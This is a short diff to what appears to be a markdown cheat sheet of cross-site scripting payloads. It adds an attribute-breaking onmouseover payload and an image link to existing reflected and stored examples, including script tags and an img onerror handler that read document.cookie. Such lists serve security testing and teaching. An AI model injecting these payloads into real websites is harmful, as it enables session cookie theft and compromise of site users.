@@ -6,6 +6,13 @@
 <script>alert(1)</script>
 <script>alert(document.cookie)</script>
 ```
+
+```
+"onmouseover="alert(1)
+```
+
+![image](https://github.com/user-attachments/assets/2a104e6f-2780-41ec-89aa-b55b49158ad7)
+
 ### stored :
 ```
 <img src="does-not-exist" onerror="alert(document.cookie)">
